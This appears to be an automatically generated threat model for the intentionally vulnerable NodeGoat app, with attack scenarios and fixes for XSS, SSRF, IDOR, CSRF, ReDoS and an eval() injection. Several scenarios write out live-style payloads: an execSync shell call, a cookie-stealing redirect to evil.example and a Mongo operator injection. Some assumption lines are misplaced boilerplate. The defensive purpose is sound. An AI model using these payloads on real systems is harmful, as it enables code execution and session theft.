threats.impactReason: Script executes on the application origin inside an authenticated session, allowing theft of session cookies and reading of SSN, DOB, bank account and routing numbers from /profile.
threats.likelihoodReason: The attacker only needs to get a logged-in user to open a crafted /research URL; the remote body is echoed verbatim with an HTML content type.

mitigation.summary: Never echo a fetched remote body as HTML; render parsed, escaped values instead.
steps: Replace the res.write(body) at app/routes/research.js:25 with rendering through the existing swig `research` template so values are HTML-escaped.
If the raw body must be shown, send it with `Content-Type: text/plain` and escape it with node-esapi's encodeForHTML, which is already a dependency used in app/routes/profile.js.
Add a Content-Security-Policy header (helmet is already in package.json) that forbids inline script on the application origin.

threats.title: The url and symbol query parameters on the /research flow reach needle.get with no validation
threats.asset: outbound request target URL
threats.attackScenario: The flow web-to-stock-service carries req.query.url and req.query.symbol straight into the concatenated destination, and no validation is applied to either before the request leaves the app, so an attacker supplies `symbol=../../admin` or an embedded credential string such as `url=http://user:pass@internal.host/` to steer the outbound request to a path and host the application never intended.
assumptions: No Express middleware upstream of the /research registration sanitises or whitelists the url and symbol query parameters.
No input validation is applied to GET /learn, so any input it reads is used unvalidated.
threats.impactReason: Unvalidated concatenation lets the caller control the full request target, including host, path and embedded credentials on the outbound leg.
threats.likelihoodReason: Both parameters are plain GET query values on a route any authenticated user can reach, and the form already exposes them. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate the symbol parameter against a strict allowlist pattern and stop reading url from the request.
steps: Add a guard at the top of displayResearch in app/routes/research.js that rejects any req.query.symbol not matching /^[A-Za-z.-]{1,10}$/ with a 400 response.
Remove req.query.url from the concatenation at app/routes/research.js:15 and use a server-side constant.
URL-encode the validated symbol with encodeURIComponent before appending it to the base URL.

threats.title: GET /research can be used to make the app host issue unbounded outbound requests, exhausting its event loop and sockets
threats.asset: availability of the NodeGoat web application
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout and no cap on the response size, so an attacker loops GET /research?url=http://attacker.example/slowloris&symbol=x against a server that trickles bytes forever, pinning open sockets and buffering huge bodies until the single Node process stops serving /login, /profile and /contributions.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
No reverse proxy or rate limiter caps concurrent /research requests in front of the application.
The application runs as a single Node process, as the Procfile's forever invocation of server.js suggests.
threats.impactReason: Blocking the single Node process denies the whole application, including login and profile access, until the sockets drain or forever restarts it.
threats.likelihoodReason: An authenticated attacker can script the request loop cheaply; only a login is needed and the handler imposes no timeout. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Bound the outbound fetch with timeouts and size limits, and rate limit /research.
steps: Pass `{ open_timeout: 3000, read_timeout: 5000, response_timeout: 5000 }` to needle.get in app/routes/research.js:16.
Cap the accepted body length and abort the request when it is exceeded before writing to the response.
Apply a per-session request limiter to the app.get("/research", ...) registration in app/routes/index.js:76.

threats.title: Session cookie for GET /allocations/:userId travels in cleartext across the trust boundary
threats.asset: session cookie and the allocation data returned in the response
threats.attackScenario: The flow is declared as HTTP and server.js builds the app with the plain `http` module while the HTTPS key/cert setup is commented out at lines 18-28, so an attacker on the same Wi-Fi captures the GET /allocations/:userId request, lifts the connect.sid cookie and replays it to browse the victim's profile, contributions and allocations.
assumptions: No TLS-terminating proxy fronts the Node process, so the browser-to-app hop really is plaintext HTTP.
threats.impactReason: A stolen session cookie yields the victim's PII (SSN, DOB, bank account and routing numbers) through /profile.
threats.likelihoodReason: Needs a network vantage point, but nothing in the app prevents the cookie from being sent over cleartext.

mitigation.summary: Force HTTPS for all browser traffic and restrict the session cookie to it.
steps: Re-enable the https.createServer block in server.js or terminate TLS at the proxy and redirect HTTP to HTTPS.
Set secure and httpOnly on the express-session cookie in server.js.
Enable helmet.hsts(), already available in package.json.

threats.title: Unvalidated threshold query parameter on GET /allocations/:userId reaches the allocations query
threats.asset: contribution and allocation data in the allocations collection
threats.attackScenario: app/routes/allocations.js:19-23 passes the raw `threshold` query string straight into allocationsDAO.getByUserIdAndThreshold with no type check or whitelist, so an attacker calls GET /allocations/2?threshold=0 or supplies a Mongo operator/expression payload in threshold to widen the result set and pull allocation rows the UI would otherwise filter out.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
The DAO interpolates or embeds the threshold value into the Mongo query rather than coercing it to a validated number.
threats.impactReason: Filtering intended to restrict returned allocation rows can be bypassed, exposing additional allocation records.
threats.likelihoodReason: The parameter is fully attacker-controlled in the URL and the route is reachable by any registered user. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate and coerce the threshold parameter before it reaches the DAO.
steps: In app/routes/allocations.js, parse threshold with Number() and reject NaN or out-of-range values with a 400 before calling getByUserIdAndThreshold.
Ensure the DAO builds the Mongo filter with a typed numeric comparison rather than string interpolation.

threats.title: Insecure direct object reference: any logged-in user reads another employee's allocations via GET /allocations/:userId
threats.asset: other employees' contribution and allocation data
threats.attackScenario: app/routes/allocations.js:16-18 takes userId from req.params instead of req.session (the session-based fix is commented out at lines 12-15) and the route at app/routes/index.js:63 only applies isLoggedIn, so an attacker signs up, notes their own id in /allocations/{{userId}}, then requests GET /allocations/1, /allocations/2 and so on to read every other employee's stock/fund/bond allocations.
assumptions: No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
userIds are small sequential integers, as suggested by the parseInt(userId) lookup in app/routes/profile.js.
threats.impactReason: The allocation records of every employee in the plan can be enumerated one id at a time.
threats.likelihoodReason: Any self-registered account reaches the route and ids are trivially enumerable in the URL path. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Derive userId from the session rather than the URL parameter.
steps: Restore the commented-out fix in app/routes/allocations.js: replace `const { userId } = req.params;` with `const { userId } = req.session;`.
If a path parameter must remain, compare it to req.session.userId and return 404 on mismatch.
Update the /allocations/{{userId}} link in app/views/layout.html accordingly.

threats.title: ReDoS via bankRouting on the profile write reached by the same browser session
threats.asset: availability of the RetireEasy web app for all employees
threats.attackScenario: A logged-in browser session that can reach GET /allocations/:userId can also POST /profile (app/routes/index.js:48), where app/routes/profile.js:59 validates bankRouting with the catastrophically backtracking pattern /([0-9]+)+\#/, so an attacker submits a long digit string with no trailing '#' and pins the single Node event loop, making the allocations page and every other route unresponsive.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
The application runs as a single Node process per the Procfile forever invocation, so one blocked event loop stalls all requests.
threats.impactReason: One request can stall the whole single-threaded server, denying all employees access to the retirement app.
threats.likelihoodReason: Any registered user can send the payload; no special privilege or timing is required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Replace the vulnerable regex and bound input length.
steps: Apply the documented fix in app/routes/profile.js: change the pattern to /([0-9]+)\#/.
Reject bankRouting values longer than a fixed maximum before running the regex.

threats.title: Session cookie and benefits form data sent over plaintext HTTP
threats.asset: the express-session cookie authenticating the POST /benefits request
threats.attackScenario: The user-benefits-post flow is declared as HTTP and server.js creates a plain http server with the HTTPS key/cert loading block commented out at server.js:18-28, so an attacker on the same network captures the session cookie from the POST /benefits request and replays it to update benefit records as that user.
assumptions: No TLS-terminating reverse proxy sits in front of the Node process in the deployed environment.
The session cookie is not marked secure, so it is transmitted over the plaintext connection.
threats.impactReason: A captured session cookie grants full application access including the admin-reachable benefits screen and user PII.
threats.likelihoodReason: Requires network-adjacent position, but no application-level defence prevents plaintext transport.

mitigation.summary: Terminate TLS and mark session cookies secure.
steps: Restore the https.createServer configuration commented out at server.js:18-28, or enforce TLS at the reverse proxy.
Set cookie: { secure: true, httpOnly: true, sameSite: 'strict' } in the express-session options in server.js.
Enable helmet.hsts(), already available in package.json, to prevent protocol downgrade.

threats.title: POST /benefits accepts unvalidated userId and benefitStartDate straight into a Mongo update
threats.asset: the benefits collection records
threats.attackScenario: The user-benefits-post flow delivers req.body.userId and req.body.benefitStartDate unchecked into benefitsDAO.updateBenefits at app/routes/benefits.js:35, so an attacker submits a non-string userId (for example userId[$gt]= via urlencoded array syntax) or an arbitrary benefitStartDate string and corrupts or mass-matches benefit records.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
No validation middleware sanitises the /benefits request body upstream of the handler.
body-parser's extended parsing allows nested objects in the urlencoded body.
threats.impactReason: Malformed or operator-shaped input can update benefit records for unintended users or store garbage dates.
threats.likelihoodReason: Reachable by any logged-in account, but exploitation depends on how the DAO builds its Mongo query. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate and coerce the benefits request body before the DAO call.
steps: Coerce userId with parseInt(req.body.userId, 10) and reject NaN in app/routes/benefits.js:30-33.
Validate benefitStartDate against an ISO date pattern and reject non-string types.
Return a 400 response rather than passing unvalidated values to benefitsDAO.updateBenefits.

threats.title: POST /benefits is reachable by any logged-in non-admin user, allowing tampering with other users' benefit start dates
threats.asset: other employees' benefit start dates in the benefits collection
threats.attackScenario: The user-benefits-post flow reaches app/routes/index.js:56 where only isLoggedIn is applied and the isAdmin middleware is left commented out at lines 57-59, so an ordinary employee signs up, posts userId=<another employee's id>&benefitStartDate=2030-01-01 to /benefits, and benefitsDAO.updateBenefits at app/routes/benefits.js:35 writes the change for an account they do not own.
assumptions: No admin role check is enforced elsewhere in the request pipeline for the /benefits POST.
No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
threats.impactReason: Any employee's benefit start date can be rewritten, corrupting HR/payroll data for the whole non-admin user list returned by getAllNonAdminUsers.
threats.likelihoodReason: Only a self-registered login is required and the userId is an ordinary form field enumerated on the benefits screen. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enforce the admin role on the benefits routes.
steps: Uncomment the isAdmin-protected route definitions at app/routes/index.js:57-59 and delete the isLoggedIn-only versions at lines 55-56.
Validate that req.body.userId refers to an existing non-admin user before calling benefitsDAO.updateBenefits.
Validate benefitStartDate against a date format before persisting it in app/routes/benefits.js.

threats.title: CSRF on POST /contributions lets an attacker's page drive the eval() sink with the victim's session cookie
threats.asset: the victim's contribution values and, through eval(), the application server process
threats.attackScenario: The user-contributions-post flow is a plain HTML form POST authenticated only by the express-session cookie, and csurf is left commented out at server.js:7, so an attacker hosts a page that auto-submits a hidden form to /contributions with preTax containing a malicious expression and the victim's browser replays its session cookie, changing the victim's contributions and reaching the eval() sink at app/routes/contributions.js:32.
assumptions: No CSRF token middleware is mounted in front of the /contributions POST route at runtime.
Session cookies are sent on cross-site form submissions (no restrictive SameSite setting).
threats.impactReason: A forged request both tampers with the victim's retirement contribution data and delivers an arbitrary-code payload into eval() under the victim's session.
threats.likelihoodReason: Requires a logged-in victim to visit an attacker-controlled page, but no other precondition; the form is a simple urlencoded POST.

mitigation.summary: Enable CSRF protection on the state-changing contributions POST.
steps: Uncomment and mount the csurf middleware already declared in package.json at server.js:7 and add the token to the contributions form.
Set the session cookie with sameSite: 'strict' and httpOnly in the express-session options in server.js.
Verify the token before handleContributionsUpdate runs in app/routes/index.js:52.

threats.title: Server-side JavaScript injection via POST /contributions preTax/afterTax/roth reaching eval()
threats.asset: the NodeGoat application server process and the MongoDB data it holds (user PII, credentials, memos)
threats.attackScenario: The browser-to-app flow user-contributions-post carries the preTax, afterTax and roth form fields straight into eval() at app/routes/contributions.js:32-34 with no parsing or whitelist, so an attacker logs in, submits POST /contributions with preTax=require('child_process').execSync('cat /etc/passwd').toString() (or a while(1) loop to hang the single Node process) and executes arbitrary code on the server.
threats.impactReason: Arbitrary code execution in the Node process gives full read/write access to the MongoDB connection and the host filesystem, and a blocking expression stops the whole single-threaded server.
threats.likelihoodReason: Any self-registered account can post the form fields; the payload is a plain HTTP body parameter with no validation before eval().

mitigation.summary: Parse contribution values as integers instead of evaluating them as code.
steps: Replace eval(req.body.preTax) etc. at app/routes/contributions.js:32-34 with parseInt(req.body.preTax, 10) as the commented-out fix already shows.
Reject non-numeric, negative or out-of-range values before calling contributionsDAO.update.
Add a server-side bound check (0-30) independent of the client form.

threats.title: Redirect target injected into GET /learn can carry javascript: or data: URIs to the browser
threats.asset: the authenticated user's session cookie
threats.attackScenario: Because the /learn handler performs no validation of request input at app/routes/index.js:70, an attacker crafts GET /learn?url=javascript:fetch('https://evil.example/?c='+document.cookie) and, on browsers or intermediaries that honour non-HTTP schemes in a Location header, the script runs in the RetireEasy origin and exfiltrates the session cookie.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
The session cookie is not marked HttpOnly, so script in the page origin can read it.
threats.impactReason: Script executing in the application origin can read the session cookie and act as the victim across every authenticated route.
threats.likelihoodReason: The parameter is trivially attacker-controlled but modern browsers block javascript: in Location, so exploitation depends on the client. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Restrict the /learn redirect to http/https URLs from a known allowlist before calling res.redirect.
steps: Parse req.query.url in app/routes/index.js:70 and reject any value whose scheme is not https:.
Compare the parsed host against a constant list of documentation hosts and 400 otherwise.

threats.title: Credentials posted to /login travel over plain HTTP and can be read on the wire
threats.asset: user credentials (userName and password) submitted at POST /login
threats.attackScenario: server.js creates the listener with the http module and leaves the https key/cert loading commented out at lines 12 and 18-28, so an attacker on the same café Wi-Fi as an employee captures the POST /login body handled at app/routes/index.js:34 and replays the plaintext userName and password to sign in as that user.
assumptions: No TLS-terminating proxy sits in front of the Node process in the deployed environment.
threats.impactReason: Captured credentials give full account takeover, exposing SSN, DOB, bank account and routing numbers stored on the profile.
threats.likelihoodReason: Requires a network position between the browser and the app, which is common on shared or hostile networks but not universally available.

mitigation.summary: Serve the application over HTTPS only and refuse credential submission over plaintext.
steps: Re-enable the https listener block in server.js (lines 18-28) and bind the app to https.createServer instead of http.
Enable helmet.hsts() (already a declared dependency in package.json) and redirect any http request to https.
Set the express-session cookie to secure: true in server.js.

threats.title: Unthrottled credential stuffing against POST /login
threats.asset: user accounts and the session cookie issued on successful login
threats.attackScenario: POST /login at app/routes/index.js:34 hands userName and password directly to userDAO.validateLogin with no attempt counter or lockout, so an attacker scripts thousands of requests per minute against a known employee userName until a leaked password matches and a valid session cookie is returned.
assumptions: No rate limiting or account lockout is applied in front of the login route in the deployed environment.
No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
threats.impactReason: A guessed password yields a full session with access to SSN, DOB, bank account and routing numbers; the bcrypt verification loop also consumes CPU under volume.
threats.likelihoodReason: The login endpoint is reachable by any unauthenticated stranger and credential-stuffing tooling is commodity. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Add per-account and per-IP throttling with progressive lockout on the login handler.
steps: Track failed attempts per userName and per source IP in the existing MongoDB connection and reject further attempts after a threshold with an increasing delay.
Apply the throttle as middleware on app.post("/login") in app/routes/index.js:34 so it runs before sessionHandler.handleLoginRequest.

threats.title: Cross-site request forgery lets a third-party page post memos as the victim
threats.asset: memos stored and rendered to all users
threats.attackScenario: csurf is a declared dependency but its require and app.use are commented out in server.js (lines 7 and the commented middleware block), so an attacker hosts a page with a hidden form auto-submitting `memo` to http://<app>/memos; a logged-in RetireEasy user visiting it has their session cookie attached automatically and the attacker's memo body is stored and rendered to every user of /memos.
assumptions: No CSRF token middleware is mounted anywhere in the request pipeline for POST /memos.
threats.impactReason: Attacker-chosen memo content is persisted and shown to all users, giving a stepping stone for stored script or social-engineering content.
threats.likelihoodReason: Only requires luring an authenticated user to any web page; no network position or credentials needed.

mitigation.summary: Enable the already-installed csurf middleware and require a token on POST /memos.
steps: Uncomment `const csrf = require('csurf');` and mount `app.use(csrf())` before the routes are registered in server.js.
Emit the token into the memo form in app/views/memos.html and validate it on app/routes/index.js:67.
Set sameSite on the session cookie in server.js as defence in depth.

threats.title: POST /memos travels over plain HTTP, exposing the session cookie to network interception
threats.asset: session cookie
threats.attackScenario: server.js keeps the HTTPS setup (fs/https key and cert loading, helmet.hsts()) fully commented out at lines 18-28 and 38-60 and serves the app via plain `http`, so an attacker on the same café Wi-Fi as a RetireEasy employee captures the POST /memos request, lifts the express-session cookie from the clear-text header, and replays it to post memos and read the victim's profile PII.
assumptions: No TLS-terminating reverse proxy sits in front of the Express app in the deployed environment.
threats.impactReason: A captured session cookie gives full account takeover, including the profile page holding SSN, DOB and bank account numbers.
threats.likelihoodReason: Requires a network position on the victim's path, but the transport carries no encryption at all so no cryptographic work is needed.

mitigation.summary: Terminate TLS for the browser-to-app flow and mark session cookies secure.
steps: Re-enable the https server block in server.js (lines 18-28) or place the app behind a TLS-terminating proxy and redirect all HTTP to HTTPS.
Re-enable helmet.hsts() in server.js so browsers refuse plain-HTTP requests to the host.
Set `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }` on the express-session options in server.js.

threats.title: Unvalidated memo body is stored and rendered to every user
threats.asset: memos rendered to all users
threats.attackScenario: The POST /memos handler in app/routes/memos.js:13 passes `req.body.memo` straight into memosDAO.insert with no length limit, type check or sanitisation, so an attacker submits a memo containing markdown/HTML payload or a multi-megabyte string over the user-memos-post flow and it is persisted and served back on /memos to every other employee.
assumptions: No body-sanitising middleware runs between body-parser and the memos handler.
No input validation is applied to GET /learn, so any input it reads is used unvalidated.
threats.impactReason: Stored content reaches all users of the memos page, and oversized bodies bloat the MongoDB collection.
threats.likelihoodReason: Any registered user can submit arbitrary memo bodies through the ordinary form. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate and bound the memo body before persisting it.
steps: In app/routes/memos.js:13 reject non-string `req.body.memo` and enforce a maximum length before calling memosDAO.insert.
Set an explicit `limit` on the body-parser configuration in server.js.
Escape or sanitise memo content at render time in the memos template rather than relying on the client.

threats.title: Unbounded memo submissions exhaust MongoDB storage and the memos page
threats.asset: memos collection availability
threats.attackScenario: With no rate limiting in front of the app and no size check in app/routes/memos.js:13, an attacker who has signed up loops POST /memos with large `memo` bodies; every insert is kept and displayMemos loads the whole collection with getAllMemos, so the memos page and the database backing it become unusable for all employees.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
No rate-limiting middleware or upstream proxy throttle protects POST /memos.
threats.impactReason: Denies the shared memos feature and can fill the MongoDB collection, affecting every user.
threats.likelihoodReason: Reachable by any self-registered account with a simple scripted loop. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Rate limit and size limit memo creation.
steps: Add a per-session rate limiter in front of app.post("/memos") in app/routes/index.js:67.
Cap memo length in app/routes/memos.js:13 and cap body-parser payload size in server.js.
Paginate getAllMemos in app/data/memos-dao.js so the read path does not load the full collection.

threats.title: CSRF on POST /profile lets an attacker overwrite a victim's SSN and bank details
threats.asset: user PII (SSN, DOB, address, bank account and routing numbers)
threats.attackScenario: csurf is listed in package.json but its require line is commented out in server.js:7 and no CSRF middleware is mounted, so an attacker hosts a page that auto-submits a hidden form to /profile with firstName, ssn, bankAcc and bankRouting fields; a logged-in employee who loads the page has their session cookie sent along and their stored bank routing details are replaced with the attacker's.
assumptions: No CSRF token middleware is mounted in front of the routes registered in app/routes/index.js.
threats.impactReason: Silently rewrites payout-relevant bank account and routing numbers and other PII for the victim's account.
threats.likelihoodReason: Only requires luring an authenticated user to an attacker-controlled page; the form fields are public in app/views/profile.html.

mitigation.summary: Enable csurf and require a per-session token on the profile update.
steps: Uncomment `const csrf = require('csurf');` in server.js:7 and mount `app.use(csrf())` before ./app/routes is registered.
Render the token as a hidden input in the form at app/views/profile.html:38 and verify it in profileHandler.handleProfileUpdate.
Add `sameSite: 'strict'` to the express-session cookie options in server.js.

threats.title: POST /profile carries SSN and bank account numbers in clear text over HTTP
threats.asset: user PII (SSN, DOB, address, bank account and routing numbers)
threats.attackScenario: server.js starts an `http` server with the HTTPS key/cert loading and helmet.hsts() left commented out (lines 18-28, 38-60), so an attacker sniffing the network path reads the POST /profile body submitted from app/views/profile.html and harvests the victim's ssn, dob, bankAcc and bankRouting fields in plain text, and can also rewrite those values in transit.
assumptions: No TLS-terminating reverse proxy sits in front of the Express app in the deployed environment.
threats.impactReason: Directly exposes social security numbers and bank account and routing numbers for any user who updates their profile.
threats.likelihoodReason: Needs a position on the network path, but the data is fully unprotected once there.

mitigation.summary: Serve the profile flow over TLS only.
steps: Re-enable the https server creation block in server.js (lines 18-28) or terminate TLS at a proxy and redirect HTTP to HTTPS.
Re-enable helmet.hsts() in server.js so browsers never send the profile form over plain HTTP.
Mark the express-session cookie `secure` and `httpOnly` in the session options in server.js.

threats.title: ReDoS via the bankRouting field on POST /profile stalls the single-threaded server
threats.asset: availability of the RetireEasy web application
threats.attackScenario: handleProfileUpdate in app/routes/profile.js:59 validates `bankRouting` with the nested-quantifier regex `/([0-9]+)+\#/`, so an attacker posts bankRouting="11111111111111111111111111111111" (long digit run with no trailing #) to /profile and the catastrophic backtracking pins the Node event loop, making the whole app unresponsive to every other user.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
The regex at app/routes/profile.js:59 is applied to the attacker-supplied bankRouting value before any length cap.
threats.impactReason: A single request can hang the single-threaded Node process, denying service to all users of the application.
threats.likelihoodReason: Any registered user can craft the input from the ordinary profile form; the vulnerable pattern is visible in the repository. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Replace the catastrophic regex and bound the input length.
steps: Change the pattern at app/routes/profile.js:59 to the non-nested `/([0-9]+)\#/` as the in-file comment describes.
Reject bankRouting values longer than a fixed maximum before running the regex.
Add per-session rate limiting to app.post("/profile") in app/routes/index.js:48 so repeated attempts are throttled.

threats.title: Signup credentials submitted over plaintext HTTP to POST /signup
threats.asset: user credentials (username and password) and the resulting session cookie
threats.attackScenario: server.js creates the listener with the `http` module while the HTTPS key/cert loading and helmet.hsts() blocks remain commented out (server.js lines 10-28, 53-54), so an attacker on the same Wi-Fi as a new user intercepts the POST /signup body routed at app/routes/index.js:38 and reads the chosen userName and password in clear text, then replays the returned session cookie to impersonate the account.
assumptions: No TLS-terminating reverse proxy or load balancer sits in front of the Express app in the deployed environment.
threats.impactReason: Cleartext capture yields account credentials and the session cookie, which unlock the profile page holding SSN, DOB, bank account and routing numbers.
threats.likelihoodReason: Requires a network position on the path between browser and app, but the signup flow is reachable by any unauthenticated stranger and carries the credential in a single request.

mitigation.summary: Serve the application over HTTPS only and mark the session cookie secure.
steps: Uncomment and use the https server setup already present in server.js (lines 20-28) instead of the plain `http` listener, or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Re-enable `helmet.hsts()` in server.js so browsers refuse plaintext submissions of /signup.
Set `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }` on the express-session configuration in server.js.

threats.title: State-changing POST routes for profile, contributions, benefits and memos accept cross-site requests
threats.asset: user PII (SSN, DOB, bank account and routing numbers) and contribution percentages
threats.attackScenario: csurf is declared in package.json but its require is commented out in server.js line 7, so no CSRF token is attached to the forms in app/views/profile.html; an attacker hosts a page that auto-submits a hidden form to POST /profile (app/routes/index.js:48) and, when a logged-in employee visits it, their session cookie is sent along and their bankAcc and bankRouting fields are silently overwritten with the attacker's.
assumptions: The express-session cookie is sent on cross-site POST requests because no SameSite attribute is configured.
threats.impactReason: An attacker can rewrite the victim's bank account and routing numbers and contribution allocations, redirecting retirement funds.
threats.likelihoodReason: Only requires a victim with an active session to load an attacker-controlled page; no token or origin check stands in the way.

mitigation.summary: Enable the csurf middleware already in package.json and emit tokens in every form.
steps: Uncomment `const csrf = require('csurf');` in server.js and register `app.use(csrf())` after the session middleware.
Add a hidden `_csrf` input rendered from `csrfToken` to the forms in app/views/profile.html, contributions, benefits and memos views.
Set `sameSite: 'lax'` on the express-session cookie in server.js as defence in depth.

threats.title: Unthrottled account creation and credential submission on POST /signup
threats.asset: the users collection and application availability
threats.attackScenario: An attacker scripts thousands of POST /signup requests (handled at app/routes/index.js:38) with generated userName values; each one triggers a bcrypt hash and a Mongo insert plus a random allocations write in SessionHandler.prepareUserData, exhausting CPU and filling the users and allocations collections until legitimate signups and logins time out.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
No rate limiting, CAPTCHA or proof-of-work is applied in front of the signup flow at any layer of the deployment.
threats.impactReason: Mass fake accounts pollute the user and allocations collections and the bcrypt work per request degrades availability for real users.
threats.likelihoodReason: The signup flow is anonymous, unauthenticated and trivially scriptable over HTTP. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Rate limit and bot-check the signup flow.
steps: Add per-IP rate limiting middleware in front of `app.post("/signup", ...)` in app/routes/index.js.
Require a CAPTCHA or email verification before the user document and allocations are written in app/routes/session.js handleSignup.
Cap concurrent bcrypt hashing so a burst of signups cannot saturate the event loop.

threats.title: Unvalidated request input reaching the /learn redirect handler on the browser-to-app flow
threats.asset: user credentials and session cookies harvested via a spoofed login page
threats.attackScenario: The handler at app/routes/index.js:70 passes `req.query.url` straight into `res.redirect()` with no allowlist or validation, so an attacker emails a logged-in RetireEasy user a link to /learn?url=https://attacker.example/login, the app bounces the browser to the attacker's clone of app/views/login.html, and the victim types their credentials into the attacker's form.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
Users receive and follow links to the application from email or chat, so an open redirect can be weaponised for phishing.
threats.impactReason: The redirect lends the application's own domain to a credential-phishing page targeting accounts that hold SSN and bank details.
threats.likelihoodReason: The parameter is fully attacker-controlled and the only precondition is that the victim has a session, which the link itself prompts them to create. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate the redirect target against a fixed allowlist of learning resources.
steps: Replace `res.redirect(req.query.url)` at app/routes/index.js:72 with a lookup of a named resource key against a hardcoded map of permitted URLs.
Reject any value that is not in the map with a 400 rather than redirecting.

threats.title: Public tutorial pages served over plaintext HTTP allow response injection into an authenticated origin
threats.asset: session cookie and user credentials of the RetireEasy application
threats.attackScenario: server.js builds on the `http` module with the HTTPS key/cert block commented out, so an attacker on the same network intercepts a GET /tutorial/ssrf response served by app/routes/tutorial.js:31 and rewrites the returned HTML to inject a script that reads the session cookie or renders a fake login form on the same origin as the real application.
assumptions: No TLS-terminating proxy fronts the deployment, so tutorial responses travel and can be rewritten in the clear.
threats.impactReason: Injected content served on the application's own origin can steal the session cookie that protects SSN, DOB and bank account data.
threats.likelihoodReason: The tutorial routes are unauthenticated and frequently visited, but tampering requires an on-path network position.

mitigation.summary: Serve all routes, including the tutorial router, over HTTPS with HSTS.
steps: Switch server.js to the commented-out https listener (lines 20-28) or terminate TLS at a proxy and redirect HTTP to HTTPS.
Enable `helmet.hsts()` in server.js so browsers never re-request /tutorial pages over plaintext.

threats.title: Tutorial pages rendered without a Content-Security-Policy, weakening containment of application XSS
threats.asset: session cookie of a logged-in RetireEasy user
threats.attackScenario: `helmet.contentSecurityPolicy()` and `helmet.frameguard()` are commented out in server.js (lines 45-51) and the tutorial templates rendered by app/routes/tutorial.js:8 and :31 extend app/views/tutorial/layout.html, which sets no CSP or frame-ancestors meta tag, so an attacker frames /tutorial/a1 inside a decoy page and clickjacks a logged-in user, or executes injected script anywhere in the app with no script-src restriction to stop cookie exfiltration.
assumptions: No reverse proxy adds Content-Security-Policy or X-Frame-Options headers in front of the Express app.
threats.impactReason: Absent CSP removes the last barrier between an injected script and theft of the session cookie that guards SSN and bank details; framing enables UI redress.
threats.likelihoodReason: The tutorial routes are unauthenticated and publicly reachable, and the missing headers apply to every response the app serves.

mitigation.summary: Re-enable helmet's CSP and frameguard for all responses including the tutorial router.
steps: Uncomment the `helmet` require and the `helmet.contentSecurityPolicy()` and `helmet.frameguard()` registrations in server.js so they apply before app/routes/index.js mounts the tutorial router.
Define an explicit script-src and style-src allowing only the local /vendor assets referenced by app/views/tutorial/layout.html.
Re-enable `app.disable("x-powered-by")` and dont-sniff-mimetype, both already present in package.json.

threats.title: Unvalidated benefits body lets any logged-in user rewrite other users' benefit start dates
threats.asset: users collection benefitStartDate fields for arbitrary users
threats.attackScenario: A non-admin logged-in user posts userId=3&benefitStartDate=2099-01-01 to POST /benefits; app/routes/benefits.js:29-35 forwards both body fields unvalidated into BenefitsDAO.updateBenefits, which issues usersCol.update({_id: parseInt(userId)}) and overwrites another user's benefit record.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
The admin-only variant of the /benefits routes remains commented out in app/routes/index.js, so only isLoggedIn guards the handler.
threats.impactReason: Any user record's benefit start date can be tampered with, corrupting business data for all employees.
threats.likelihoodReason: Reachable by any authenticated account with a single crafted form post; ids are small integers. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate the benefits payload and enforce an admin role before the DAO write.
steps: Re-enable the isAdmin middleware on app.post("/benefits") in app/routes/index.js.
Validate benefitStartDate against an ISO date format and userId as a positive integer in app/routes/benefits.js before calling benefitsDAO.updateBenefits.
Reject the request with 400 when validation fails instead of passing values through to app/data/benefits-dao.js.

threats.title: Unvalidated contribution values reach eval() and then the contributions DAO write
threats.asset: contribution and allocation data stored in the contributions collection
threats.attackScenario: An authenticated user posts preTax=require('child_process').execSync('id').toString() to POST /contributions; app/routes/contributions.js:32-34 passes the raw body straight into eval() before ContributionsDAO.update writes the resulting value into the contributions collection, so arbitrary server-side JavaScript runs and forged contribution documents are persisted over the handler-to-DAO call.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
No upstream middleware coerces or validates req.body.preTax/afterTax/roth before the handler runs.
threats.impactReason: Server-side JavaScript injection on the path that writes contribution records gives full control of the Node process and of the data written to MongoDB.
threats.likelihoodReason: Any registered user can reach POST /contributions and control the three body fields directly. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Replace eval() with numeric parsing and validate before calling the DAO.
